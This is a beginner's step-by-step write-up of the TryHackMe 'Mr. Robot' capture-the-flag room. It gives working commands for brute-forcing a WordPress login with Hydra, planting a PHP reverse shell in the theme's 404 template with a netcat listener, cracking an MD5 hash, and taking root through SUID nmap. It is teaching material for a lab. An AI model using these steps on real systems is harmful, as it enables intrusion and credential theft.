# Mr. Robot CTF — Beginner's Step-by-Step Guide

> **What is this?**
> This is a guided walkthrough of a cybersecurity challenge called "Mr. Robot" on a training platform called TryHackMe. You are playing the role of an ethical hacker trying to find hidden "keys" inside a fake website. Everything is legal and contained inside TryHackMe's safe practice environment.
>
> **Who is this for?**
> Your study group members with no IT background. Every step explains **what you are doing**, **why you are doing it**, **where the tool came from**, and **how we knew to use it** — in plain language.

---

## Before You Start — What You Need

| What | Where to get it |
|---|---|
| A TryHackMe account | https://tryhackme.com (free) |
| The Mr. Robot room started | Search "Mr Robot" on TryHackMe, click "Start Machine" |
| Kali Linux running | Your VM or the TryHackMe in-browser AttackBox |
| VPN connected | Download the `.ovpn` file from TryHackMe and connect |

---

## Where Does Kali Linux Come From?

> **What is Kali Linux?**
> Kali Linux is a free, open-source operating system built specifically for cybersecurity professionals and students. It was created by a company called **Offensive Security** and is maintained by them. You can download it for free from https://www.kali.org.
>
> Think of it as a **specialised mechanic's garage** — instead of buying tools one by one, you get a workshop with hundreds of professional tools already installed and ready to use the moment you start the car. Every tool we use in this room (nmap, Hydra, netcat, Python, hashcat) comes **pre-installed** on Kali Linux. You don't need to buy, download, or set anything up separately.

**Why does this matter?** Because when someone asks "where did you get nmap?" or "where did Hydra come from?" — the answer is: it was already there, installed by Kali, ready to use.

---

## The Big Picture — What Are We Doing?

Imagine the target machine is a **locked house**. Inside the house are 3 hidden envelopes (keys). Our job is to:

1. **Knock on every door and window** — find out what the house has (reconnaissance)
2. **Find an unlocked door** — discover a weak point (enumeration)
3. **Walk in** — get access to the house (exploitation)
4. **Find a master key inside** — get higher-level access (privilege escalation)
5. **Collect all 3 envelopes** — find all 3 keys

---

## Phase 1 — Reconnaissance (Looking Around)

### Step 1.1 — Scan the Target

**Open your Kali terminal and type:**

```bash
nmap -Pn -sC -sV 10.49.164.182
```

> Replace `10.49.164.182` with the IP address shown on your TryHackMe room page.

#### What is nmap and where does it come from?

`nmap` (Network Mapper) is a **free, open-source port scanner** created by Gordon Lyon (known online as "Fyodor") in 1997. It is one of the most widely used security tools in the world and is **pre-installed on every Kali Linux system**. You can find it at https://nmap.org if you ever need to install it elsewhere.

Think of nmap as a **building inspector walking around a house** — it sends small "knocks" to every possible entry point (called "ports") and reports back which ones are open, closed, or locked.

#### Why are we running this command?

Before you try to break into anything, you need to know what you're dealing with. You wouldn't try to pick a lock without first finding the door. This scan tells us: what services are running on this machine? A web server? An email server? SSH? Each open port is a potential way in.

#### What do the flags mean?

| Flag | Full Name | Why we use it |
|---|---|---|
| `-Pn` | No ping | By default nmap first pings the target to check if it's alive. TryHackMe machines often block pings, so nmap would think the machine is offline and skip it. `-Pn` tells nmap "assume it's online and scan anyway." |
| `-sC` | Default scripts | Runs nmap's built-in detection scripts that automatically grab extra information — like the exact software version, website title, SSL certificate details. Saves us several manual steps. |
| `-sV` | Version detection | After finding an open port, nmap probes it to find out exactly what software is running and what version. This is critical — we need the exact version number to search for known vulnerabilities. |

> **Note:** For Mr. Robot we didn't use `-p-` (scan all 65,535 ports) because only ports 80, 443, and 22 are relevant here and a full port scan is slower. The default scan covers the 1,000 most common ports, which is sufficient for this machine.

#### What you should see:

```
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
443/tcp open   https    Apache httpd
```

#### What this means in plain English:

- Port 22 (SSH — remote control) = closed, we can't get in this way
- Port 80 (HTTP — normal website) = open! There's a website here
- Port 443 (HTTPS — secure website) = open! Same website but encrypted

> **Why does the version number matter?**
> Every piece of software has bugs. Security researchers discover bugs and publish them publicly with a code number (called a CVE). To find bugs in this server, we need to know exactly what software is running and which version. nmap's `-sV` flag extracts this automatically.

---

### Why Did We Target WordPress Specifically?

After nmap showed port 80 (web server) open, we opened a browser and visited `http://10.49.164.182`. The website displayed a Mr. Robot-themed interactive animation. By looking at the page source code and noticing files like `/wp-login.php`, `/wp-content/`, and `/wp-admin/` in the network traffic, we confirmed this was **WordPress**.

**What is WordPress?**
WordPress is the most popular website-building platform in the world — used by approximately 43% of all websites. It was created in 2003 and is free, open-source software available at https://wordpress.org. Because it's so widespread, every security tester already knows exactly where all the login pages, admin panels, and file upload areas are located.

**Why does WordPress matter to an attacker?**
WordPress administrators have the built-in ability to edit the PHP files that control the website's appearance (called "themes"). This is a legitimate feature — but if we can log in as an admin, we can abuse this feature to run our own code on the server. This is the attack path we use in Step 3.

**How did we know to look at `/wp-login.php`?**
This is WordPress's default admin login page and has been the same for over 20 years. Every security tester memorises this path. It's like knowing that every house built by the same builder has the back door in the same place.

---

### Step 1.2 — Check robots.txt

**In your terminal, type:**

```bash
curl http://10.49.164.182/robots.txt
```

#### What is `curl` and where does it come from?

`curl` (Client URL) is a **command-line tool for making web requests**. It's free, open-source, and was created by Daniel Stenberg in 1997. It is **pre-installed on Kali Linux** and on most Linux and macOS systems. Think of it as "a web browser you control from the terminal" — instead of clicking a link, you type the address and curl fetches the page for you.

#### What is `robots.txt` and why do we check it?

Every website has a file called `robots.txt` — it's like a **"staff notice board"** that tells Google's search bots which pages NOT to index. It's meant to be read by automated search bots, but anyone can read it by going to `/robots.txt` on any website. Hackers always check it first because website owners sometimes accidentally list sensitive files they want to hide from Google — not realising that those files are still publicly accessible to anyone who knows the URL.

Checking `robots.txt` is one of the first things any security tester does. It's on every penetration testing checklist and every CTF beginner guide — because it costs nothing to check and it frequently reveals useful information.

**What you should see:**

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

**What this means:**
The website is telling search bots to ignore two files — but they're still accessible to us! We found a wordlist (`fsocity.dic`) and the first key is sitting right there.

---

### Step 1.3 — Grab Key 1

```bash
curl http://10.49.164.182/key-1-of-3.txt
```

**What you should see:**
```
073403c8a58a1f80d943455fb30724b9
```

**Congratulations — Key 1 found!** Copy this value and paste it into TryHackMe.

---

### Step 1.4 — Download the Wordlist

```bash
wget http://10.49.164.182/fsocity.dic -O fsocity.dic
```

#### What is `wget` and where does it come from?

`wget` (Web Get) is a **command-line file downloader**. It's free, open-source, and created by Hrvoje Nikšić under the GNU project. Like `curl`, it's **pre-installed on Kali Linux**. While `curl` is better for viewing web content, `wget` is better for downloading and saving files to disk. The `-O fsocity.dic` flag tells wget to save the file with that specific filename.

**What is `fsocity.dic`?**
A dictionary file — a giant list of words. Think of it as a **phone book of passwords**. We'll use it later to guess the website's login password.

**Why download it?**
The website accidentally left its own password list publicly accessible. We'll use the target's own list against it — like a burglar finding the spare house key under the doormat. This file is clearly related to the Mr. Robot TV show and was placed here intentionally as part of the CTF challenge to simulate a real-world information leak.

---

### Step 1.5 — Clean Up the Wordlist

```bash
sort -u fsocity.dic > fsocity-uniq.dic
wc -l fsocity-uniq.dic
```

**What are `sort` and `wc`?**
Both are standard **Linux command-line utilities** that come pre-installed on every Linux system (including Kali).
- `sort -u` sorts all lines alphabetically AND removes duplicates (`-u` = unique)
- `wc -l` counts the number of lines in a file (`-l` = lines)
- The `>` symbol redirects the output into a new file called `fsocity-uniq.dic`

**What is this doing?**
The original file has 858,160 words — but most are duplicates. After deduplication, only **11,451 unique words** remain.

**Why are we doing this?**
Trying 858,160 passwords would take hours. Trying 11,451 takes a few minutes. We're being efficient — there's no point trying the same password twice. This is a real technique used by professional penetration testers to reduce attack time.

---

## Phase 2 — Finding the Login (Enumeration)

### Step 2.1 — Identify the Website

Open a browser and go to `http://10.49.164.182`

You'll see a Mr. Robot themed interactive website. Try going to:
`http://10.49.164.182/wp-login.php`

You'll see a WordPress login page — confirming this server runs WordPress.

---

### Step 2.2 — Find the Username

```bash
curl -s -X POST http://10.49.164.182/wp-login.php \
  -d "log=elliot&pwd=wrongpassword" | grep -i "incorrect\|invalid"
```

**What are we doing?**
WordPress has a design flaw — it gives **different error messages** depending on whether the username exists or not:

- Wrong username → "Invalid username"
- Right username, wrong password → "The password you entered for the username **elliot** is incorrect"

**Why does this matter?**
This is called **username enumeration** — the website is leaking information about which usernames exist. Think of it like a security guard who says "there's no employee named John here" vs "John is here but you don't know his PIN." The second message confirms the name is correct. WordPress is effectively telling us who has an account.

**How did we know to try `elliot`?**
The Mr. Robot CTF is based on the TV show "Mr. Robot." The main character is Elliot Alderson, a hacker. In CTF challenges, usernames often relate to the theme. `elliot` was an obvious first guess — and it confirmed immediately.

> **Username confirmed: `elliot`**

---

### Step 2.3 — Brute Force the Password

```bash
hydra -l elliot -P fsocity-uniq.dic 10.49.164.182 \
  http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR" \
  -t 30
```

#### What is Hydra and where does it come from?

`hydra` is a **free, open-source network login cracker** created by a group called "The Hacker's Choice" (THC) and maintained on GitHub at https://github.com/vanhauser-thc/thc-hydra. It is **pre-installed on Kali Linux**. Think of Hydra as an **automated lock picker** — it tries thousands of passwords very quickly, one after another, until it finds the right one.

#### Breaking down the command:

| Part | What it means |
|---|---|
| `-l elliot` | Use the username `elliot` (single username, lowercase `-l`) |
| `-P fsocity-uniq.dic` | Use this file as the password list (uppercase `-P` = file of passwords) |
| `10.49.164.182` | The target IP address |
| `http-post-form` | The type of attack — we're submitting an HTTP form (like clicking the Login button) |
| `"/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:ERROR"` | The exact format of the login form: URL, fields, and what text appears when login fails |
| `^USER^` and `^PASS^` | Placeholders — Hydra replaces these with the username and each password from our list |
| `-t 30` | Use 30 parallel threads (30 simultaneous attempts) to speed things up |

**How did we know the form field names (`log`, `pwd`, `wp-submit`)?**
By right-clicking the WordPress login page in a browser → View Page Source → look at the `<form>` HTML. The field names are written right there. Alternatively, Burp Suite (a traffic intercepting tool, also pre-installed on Kali) can capture a real login attempt and show you exactly what was sent.

**Why does this attack work?**
The website has no limit on how many times you can try to log in (no "rate limiting" or CAPTCHA). Without that protection, a program can try thousands of passwords per second. This is called a **brute force attack**.

**What you should see after a few minutes:**
```
[80][http-post-form] host: 10.49.164.182   login: elliot   password: ER28-0652
```

> **Credentials found: `elliot` / `ER28-0652`**

`ER28-0652` is a reference to the TV show — it's Elliot's employee ID at E-Corp (Evil Corp). Another CTF where the theme gives you the answer.

---

## Phase 3 — Getting Inside (Exploitation)

### Step 3.1 — Log Into WordPress

Go to `http://10.49.164.182/wp-login.php` in your browser.

Log in with:
- Username: `elliot`
- Password: `ER28-0652`

You're now inside the WordPress admin dashboard — like being behind the reception desk of the building.

---

### Step 3.2 — Where Does the Reverse Shell Come From?

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.php
```

#### What is `/usr/share/webshells/`?

This is a **directory that comes pre-installed on Kali Linux** containing ready-made shell scripts in multiple programming languages (PHP, ASP, JSP, Perl, Python). The PHP reverse shell at `/usr/share/webshells/php/php-reverse-shell.php` was originally written by **pentestmonkey** (a well-known security researcher). The original source is on GitHub: https://github.com/pentestmonkey/php-reverse-shell.

The script was written specifically for CTF challenges and penetration testing. It is a legitimate security testing tool included in Kali for authorised testers.

**What does `cp` do?**
`cp` (copy) is a standard Linux command that copies a file from one location to another. We copy the shell to our working directory so we can edit it without modifying the original.

#### What is a reverse shell?

Normally you connect TO a computer. A reverse shell is the opposite — you make the **target computer call YOU**. Think of it like this: instead of knocking on someone's door, you trick them into calling your phone number. This works because:
- **Firewalls** usually block random computers from connecting IN to a server (stops attackers)
- But firewalls usually allow servers to connect OUT to the internet (needed for updates, APIs, etc.)
- A reverse shell exploits the "outgoing allowed" rule by making the server call us

#### Why PHP?

WordPress runs on PHP — all WordPress themes and plugins are PHP files. If we can inject a PHP file into WordPress and make the server run it, the server executes our code. PHP was the natural language choice because the target server already has a PHP interpreter running.

---

### Step 3.3 — Edit the Shell to Point to You

Open `shell.php` in a text editor and change these two lines:

```php
$ip = '127.0.0.1';   // Change to YOUR tun0 IP
$port = 1234;         // Change to 4444
```

**How to find your tun0 IP:**
```bash
ip a | grep tun0
```

#### Why `tun0` and NOT `eth0`?

This is a common beginner mistake. When you connect to TryHackMe's VPN, it creates a **virtual network interface** called `tun0` (TUN = tunnel). The target machine (`10.49.164.182`) is inside TryHackMe's private network — it can only reach you through the VPN tunnel.

- `eth0` = your real network card IP (your home router address — the target cannot reach this)
- `tun0` = your VPN tunnel IP (the target CAN reach this because both of you are on the same VPN)

Using the wrong IP means the reverse shell will try to call back to an address it can't reach — and you'll sit waiting for a connection that never comes.

---

### Step 3.4 — Start Your Listener

Open a **second terminal** and type:

```bash
nc -lvnp 4444
```

#### What is Netcat (`nc`) and where does it come from?

**Netcat** is known as the "Swiss Army knife of networking." It was originally written by Hobbit in 1995 and is **pre-installed on Kali Linux** (and most Linux systems). It can open connections, listen for connections, send files, and much more. It's one of the most fundamental networking tools in existence.

#### Breaking down the flags:

| Flag | What it does | Why we need it |
|---|---|---|
| `-l` | Listen | Without this, nc tries to connect OUT. We want it to wait for an incoming connection. |
| `-v` | Verbose | Shows details like "connection received from X.X.X.X" so we know when the shell connects |
| `-n` | No DNS lookup | Tells nc not to resolve IP addresses to hostnames (faster, works even without DNS) |
| `-p 4444` | Port 4444 | The port number to listen on — must match the port you put in `shell.php` |

Leave this terminal open and running. It is now waiting like a phone on the table, expecting a call.

---

### Step 3.5 — Inject the Shell via Theme Editor

In the WordPress dashboard:
1. Go to **Appearance → Editor** (in the left sidebar)
2. On the right side, click **404 Template (404.php)**
3. Select ALL the text in the editor and DELETE it
4. Paste in the entire contents of your `shell.php` file
5. Click **Update File**

**What are we doing?**
WordPress's Theme Editor lets administrators edit the PHP files that control how the website looks. The **404.php** file is what WordPress shows when someone visits a page that doesn't exist. We're replacing it with our reverse shell code.

**Why the 404 page?**
Because we can trigger it easily by visiting any URL that doesn't exist on the website. As soon as the server runs the 404 page, it runs OUR code instead — which makes it call back to our waiting netcat listener.

**Why does WordPress allow editing PHP files at all?**
It was designed as a convenience feature for developers who need to customise themes quickly without FTP access. In production environments this feature should be disabled — it's a well-known WordPress security hardening recommendation. We're abusing a legitimate admin feature.

> **Security note:** After our change, the active theme's `404.php` contains our reverse shell. Any 404 error on this site will trigger it until the file is restored or the theme is changed.

---

### Step 3.6 — Trigger the Shell

In your **first terminal**, type:

```bash
curl http://10.49.164.182/thispageisnotreal
```

**What is happening?**
You're asking the website for a page that doesn't exist. WordPress calls the 404.php file to handle this. But 404.php is now YOUR reverse shell — so the server runs your code, which makes it call back to your listener.

**Check your second terminal (the listener).** You should see:

```
connect to [YOUR IP] from 10.49.164.182
$ whoami
daemon
```

**You have a shell! You're now inside the server — as a user called `daemon`.**

> **What is `daemon`?**
> A low-privileged system user. Linux systems have many built-in background service accounts — `daemon` is one of them. Like being a janitor who got into the building — you're inside, but you can't access the executive offices yet.

---

### Step 3.7 — Stabilise the Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

#### What is Python and where does it come from?

**Python** is a free, open-source programming language created by Guido van Rossum in 1991. It is **pre-installed on Kali Linux** and on virtually every Linux server in the world. We're not running a script file here — we're using the `-c` flag to run a tiny one-line Python program directly from the command line.

#### What is `pty.spawn` and why do we need it?

`pty` stands for "**pseudo-terminal**." This is part of Python's standard library — no installation needed.

The raw netcat shell we just received is like a **walkie-talkie** — it can send and receive text but has no concept of a proper terminal. This causes two problems:

1. **The `su` command won't work** — `su robot` (which we need later) requires a TTY (teletype terminal) to accept a password. Without a proper TTY, it exits with "must be run from a terminal."
2. **Arrow keys and Ctrl+C don't work properly** — a raw shell has no terminal control sequences

`python -c 'import pty; pty.spawn("/bin/bash")'` creates a **fake terminal** that behaves like a real one. It wraps `/bin/bash` in a pseudo-terminal device so that programs that require a TTY (like `su`) will work.

`export TERM=xterm` tells the shell what kind of terminal it's in — this enables colour output, proper screen clearing, and other terminal features.

> **Why Python specifically?** Because it's universally available on Linux servers and its standard library includes `pty`. No external tools or downloads needed. This is a standard, well-known technique used in CTF competitions and real-world penetration testing.

---

## Phase 4 — Getting More Access (Privilege Escalation to `robot`)

### Step 4.1 — Look Around

```bash
ls -la /home/robot/
```

**What is `ls -la`?**
`ls` lists files in a folder. `-l` shows detailed information (permissions, owner, size, date). `-a` shows all files including hidden ones (files starting with `.`). Together, `-la` gives you a complete picture of everything in a directory — like opening a filing cabinet and reading the label, owner, and lock type on every folder.

**What you should see:**
```
-r-------- robot robot  key-2-of-3.txt
-rw-r--r-- robot robot  password.raw-md5
```

**Key 2 is here but we can't read it** — it's locked to the user `robot`. We need to become `robot` first.

But we CAN read `password.raw-md5`:

```bash
cat /home/robot/password.raw-md5
```

**Output:**
```
robot:c3fcd3d76192e4007dfb496cca67e13b
```

**What is this?**
A password that has been converted into a scrambled code called a **hash**. `c3fcd3d76192e4007dfb496cca67e13b` is an MD5 hash.

---

### Step 4.2 — Crack the Password Hash

#### What is MD5 and why is it weak?

**MD5** (Message Digest Algorithm 5) was designed by Ron Rivest in 1991 as a way to store passwords securely. The idea: you convert the password into a scrambled string (hash), store the hash, and never store the real password. When someone logs in, you hash what they type and compare hashes.

**The problem:** MD5 was mathematically broken decades ago. It's extremely fast to compute, which means:

1. **Rainbow tables exist** — pre-computed databases that list millions of common passwords alongside their MD5 hashes. If your password is common, the hash is already in the table. No cracking needed — just look it up.
2. **Speed** — a modern GPU can compute 100 billion MD5 hashes per second, making brute force trivially fast.
3. **CrackStation** (https://crackstation.net) maintains a free lookup database of 15 billion passwords and their hashes. If the password is at all common, it appears instantly.

#### Option A — Easiest (Online via CrackStation):

1. Go to https://crackstation.net in your browser
2. Paste `c3fcd3d76192e4007dfb496cca67e13b`
3. Click "Crack Hashes"

**Result appears instantly:**
```
c3fcd3d76192e4007dfb496cca67e13b → abcdefghijklmnopqrstuvwxyz
```

#### Option B — Using Hashcat (in Kali):

```bash
echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

#### What is Hashcat and where does it come from?

**Hashcat** is a **free, open-source password recovery tool** and is the world's fastest password cracker. It was written by Jens Steube and is available at https://hashcat.net. It is **pre-installed on Kali Linux**.

`-m 0` tells hashcat what type of hash to crack. Mode `0` = MD5. Hashcat supports over 300 hash types.

#### What is `rockyou.txt` and where does it come from?

`/usr/share/wordlists/rockyou.txt` is a **real leaked password database** included with Kali Linux. Here's its origin:

In 2009, a social gaming website called **RockYou.com** was hacked. The attackers stole 32 million user passwords — which were stored in plain text (a massive security failure). The entire list was leaked publicly. Security researchers collected it and turned it into the most widely used password wordlist in the world. The full list contains over 14 million unique passwords in order of how commonly they were used.

When we crack passwords in security training, we use this list because it reflects **passwords real people actually choose** — making it highly effective at cracking weak passwords like `abcdefghijklmnopqrstuvwxyz`.

**Result:**
```
c3fcd3d76192e4007dfb496cca67e13b → abcdefghijklmnopqrstuvwxyz
```

> **Password cracked: `abcdefghijklmnopqrstuvwxyz`**

Someone used the entire alphabet as their password. A terrible password — which is exactly why it cracked instantly. It's in every wordlist ever made.

---

### Step 4.3 — Switch to `robot`

```bash
su robot
```

Type the password when prompted: `abcdefghijklmnopqrstuvwxyz`

```bash
cat /home/robot/key-2-of-3.txt
```

**You found Key 2!**

> **Why didn't `su` work before?** Because `su` requires a proper TTY terminal to accept passwords interactively. Our raw netcat shell didn't have one. The `python -c 'import pty; pty.spawn("/bin/bash")'` command we ran in Step 3.7 created the TTY that makes `su` work here.

---

## Phase 5 — Becoming the Most Powerful User (Privilege Escalation to root)

### Step 5.1 — Search for SUID Files

```bash
find / -perm -4000 -type f 2>/dev/null
```

**What is `find` and where does it come from?**
`find` is a standard Linux command — **pre-installed on every Linux system**. It searches for files based on criteria you specify (name, permissions, owner, size, date, etc.).

#### Breaking down the command:

| Part | What it means |
|---|---|
| `/` | Start searching from the root of the entire filesystem |
| `-perm -4000` | Find files where the SUID permission bit (4000) is set |
| `-type f` | Only return regular files (not directories or symlinks) |
| `2>/dev/null` | Redirect error messages to `/dev/null` (trash) — suppresses "Permission denied" errors from folders we can't read, so the output is clean |

#### What is SUID?

**SUID** stands for "Set User ID." When a file has this flag, it **runs as its owner** no matter who executes it. If a file owned by `root` has SUID set, anyone who runs it temporarily gets root-level powers for that specific program.

This exists for legitimate reasons — for example, the `passwd` command needs root access to update the password file, but it has SUID so any normal user can change their own password.

The danger: **if a program with SUID can be tricked into running other commands**, those other commands also run as root.

Think of it like finding a **master key hidden inside a filing cabinet**. Anyone who reaches the filing cabinet can use the master key — regardless of who they are.

**What you should see:**
```
/usr/local/bin/nmap
```

This is unusual — `nmap` (our port scanner tool) has the SUID bit set and is owned by root. That means when we run it, it runs as root.

---

### Step 5.2 — How Did We Know nmap Could Be Exploited?

This is the key question every beginner asks. The answer is **GTFOBins**.

**GTFOBins** (https://gtfobins.github.io) is a free, publicly maintained reference database of Unix binaries that can be exploited by attackers to escalate privileges. The name stands for "**Get The F*** Off Binaries**" — Unix programs that can help you escape restrictions.

When we find a SUID binary, we look it up on GTFOBins:
1. Go to https://gtfobins.github.io
2. Search for `nmap`
3. Click "SUID" tab
4. It shows exactly how to exploit it

GTFOBins documents that **old versions of nmap (before 5.x)** included an `--interactive` mode that allowed running arbitrary shell commands. Because this nmap is running as root (SUID), any shell it opens is also a root shell.

This is not secret knowledge — it's public, documented, and included in every security training curriculum. The machine intentionally runs an old version of nmap for this CTF challenge.

---

### Step 5.3 — Confirm the nmap Version

```bash
nmap --version
```

**Expected output:**
```
Nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

Version 3.81 — released in 2005 — is well below the threshold. The `--interactive` mode was removed in later versions precisely because of this security risk. The machine was configured with this old version intentionally for the CTF.

---

### Step 5.4 — Exploit nmap's Interactive Mode

```bash
nmap --interactive
```

You'll see a `nmap>` prompt. Now type:

```bash
!sh
```

**What just happened?**
Old versions of nmap had an "interactive mode" for running scans and shell commands interactively. The `!` prefix means "execute this as a shell command." We typed `!sh` to open a shell (`sh` = shell). Because nmap is running as root (due to SUID), the shell it opens is also running as root.

**Verify:**
```bash
whoami
```

**Output:**
```
root
```

**You are now root — the most powerful user on the system. You control everything.**

---

### Step 5.5 — Grab the Final Key

```bash
cat /root/key-3-of-3.txt
```

**Key 3 found — all 3 keys collected! The machine is fully compromised.**

---

## Where Every File and Tool Came From — Quick Reference

| Tool / File | Where it comes from | How we knew about it |
|---|---|---|
| **nmap** | Pre-installed on Kali Linux (https://nmap.org) | Industry-standard first step in every pentest |
| **curl** | Pre-installed on Kali Linux and most Linux systems | Standard tool for making HTTP requests from terminal |
| **wget** | Pre-installed on Kali Linux and most Linux systems | Standard tool for downloading files from URLs |
| **sort, wc** | Built-in Linux utilities, pre-installed on every Linux system | Standard Unix commands taught in Linux basics |
| **Hydra** | Pre-installed on Kali Linux (https://github.com/vanhauser-thc/thc-hydra) | Industry-standard login brute-force tool, well-known in CTF community |
| **php-reverse-shell.php** | Pre-installed at `/usr/share/webshells/php/` on Kali | Written by pentestmonkey (security researcher); part of Kali's webshells package |
| **Netcat (nc)** | Pre-installed on Kali Linux and virtually every Linux system | Fundamental networking tool; every security student learns it |
| **Python `pty` module** | Built into Python's standard library — no install needed | CTF standard technique for TTY upgrade; documented on every pentesting blog |
| **hashcat** | Pre-installed on Kali Linux (https://hashcat.net) | Industry-standard hash cracking tool |
| **rockyou.txt** | Pre-installed on Kali at `/usr/share/wordlists/rockyou.txt` | Leaked from 2009 RockYou breach; most widely used password wordlist |
| **find** | Built-in Linux utility, pre-installed on every Linux system | Standard Unix command; SUID search is a textbook privilege escalation step |
| **GTFOBins knowledge** | https://gtfobins.github.io (free public database) | Reference site for finding privilege escalation paths via SUID binaries |
| **CrackStation** | https://crackstation.net (free online service) | Free MD5/hash lookup tool; widely used in CTF community |
| **WordPress login at /wp-login.php** | General WordPress knowledge | Default path for 20+ years; memorised by every security tester |
| **fsocity.dic** | Downloaded directly from the target machine's web server | Found via `robots.txt` — the target exposed it accidentally |

---

## Summary — What We Did and Why

| Phase | What We Did | Why It Worked |
|---|---|---|
| 1. Reconnaissance | Scanned all ports with nmap | Found the website running on port 80/443 |
| 2. Enumeration | Read robots.txt, downloaded wordlist | Website accidentally exposed its own password list and Key 1 |
| 3. Username discovery | Tested login with fake password | WordPress leaks whether usernames exist via different error messages |
| 4. Brute force | Tried 11,451 passwords with Hydra | No login attempt limit — automated guessing worked |
| 5. Shell injection | Replaced WordPress 404 template with PHP reverse shell | Admins can edit PHP files — we abused that legitimate feature |
| 6. TTY upgrade | Used Python `pty.spawn` | Required to use `su` in a netcat shell |
| 7. Hash cracking | Cracked MD5 hash from readable file | MD5 is obsolete; `abcdefghijklmnopqrstuvwxyz` was in every wordlist |
| 8. Privilege escalation | Used SUID nmap's `--interactive` mode | Old nmap (v3.81) ran as root via SUID — any shell it opened was root |

---

## Glossary — Plain English Definitions

| Term | What it means |
|---|---|
| **Port** | A numbered doorway on a computer. Port 80 = website, Port 22 = remote control, Port 443 = secure website |
| **nmap** | A free tool that checks which ports are open on a target computer and what software is running |
| **curl** | A terminal command for fetching web pages and content from URLs |
| **wget** | A terminal command for downloading and saving files from URLs |
| **WordPress** | A popular website builder platform used by ~43% of all websites |
| **Brute force** | Automatically trying every possible password until one works |
| **Hydra** | A tool that automates brute force attacks against login pages |
| **robots.txt** | A file on every website that tells search bots what not to index — but it's publicly readable |
| **Reverse shell** | Making the target computer connect back to you instead of the other way around |
| **Netcat (nc)** | A tool for opening and receiving raw network connections |
| **php-reverse-shell.php** | A PHP script (created by pentestmonkey) that makes a server call back to an attacker |
| **TTY / PTY** | A terminal interface. PTY = fake terminal. `su` requires a TTY to work properly |
| **pty.spawn** | Python command that creates a fake terminal (PTY) — needed to use `su` in a netcat shell |
| **Hash / MD5** | A scrambled one-way version of a password. MD5 is old and weak — can be looked up in seconds |
| **CrackStation** | Free website with a database of 15 billion pre-computed hashes — instant lookup for common passwords |
| **rockyou.txt** | A list of 14 million real passwords from a 2009 data breach — used as a wordlist for cracking |
| **SUID** | A permission flag that makes a program run as its owner. SUID + root owner = dangerous if the program can run other commands |
| **GTFOBins** | A free public database of Unix programs that can be exploited for privilege escalation (https://gtfobins.github.io) |
| **Root** | The most powerful user on a Linux system — like a building owner with master keys to everything |
| **daemon** | A background system user with limited permissions — the user WordPress processes run as |
| **Privilege escalation** | Going from a low-level user to a higher-level user |
| **Username enumeration** | Discovering valid usernames by observing how a system responds differently to valid vs invalid names |
| **Dictionary attack** | Trying a list of known words/passwords rather than every possible character combination |
| **Theme Editor** | A WordPress admin feature that allows editing PHP template files directly in the browser |
| **Interactive mode (nmap)** | A feature in old nmap versions (before 5.x) that let users run shell commands — removed because it was a security risk |

---

## Troubleshooting — When Things Go Wrong

| Problem | What to check |
|---|---|
| Shell doesn't connect back | Check that your **tun0** IP (not eth0) is in shell.php. Run `ip a | grep tun0` to confirm |
| `su robot` says "must have a TTY" | Run `python -c 'import pty; pty.spawn("/bin/bash")'` first to create a proper terminal |
| nmap `--interactive` not available | Confirm version: `nmap --version` — must be 3.81 (below 5.x). Later versions removed this feature |
| Hydra takes too long | Make sure you used `fsocity-uniq.dic` (11k words) not the original (858k words) |
| Can't read key-2-of-3.txt | You must `su robot` first — the file is readable only by the `robot` user |
| WordPress "Update File" button missing | Try a different theme's 404.php — ensure you're editing the active theme |
| 404 page doesn't trigger the shell | Visit any non-existent URL: `curl http://TARGET/anythingfake` — or try the direct path `curl http://TARGET/wp-content/themes/twentyfifteen/404.php` |
| Hydra finds no result | Check that the failure string matches — try logging in manually and see what text appears when login fails; update the Hydra `ERROR` string accordingly |
